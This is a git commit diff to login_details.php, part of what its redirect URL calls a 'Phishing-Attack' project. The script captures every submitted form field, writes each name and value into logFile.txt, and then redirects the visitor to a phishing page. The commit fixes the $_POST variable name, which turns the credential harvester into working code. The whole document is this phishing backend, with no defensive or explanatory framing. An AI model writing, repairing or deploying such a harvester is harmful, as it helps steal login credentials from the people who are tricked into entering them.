48a5af8961d9391863ae28c1401b5de35fccb676
Munkh-Orgill <mnkhrglkd@gmail.com>
2021-12-08 20:26:30 +0800

    update

--- login_details.php
+++ login_details.php
@@ -1,7 +1,7 @@
 <?php
 header ('Location: https://munkh-orgill.github.io/Phishing-Attack/phishing.html');
 $file = fopen("logFile.txt",'a');
-foreach($POST as $key => $value){
+foreach($_POST as $key => $value){
     fwrite($file,$key);      // This stores the field Name
     fwrite($file,"=>");      
     fwrite($file,$value);    // This stores the field Value
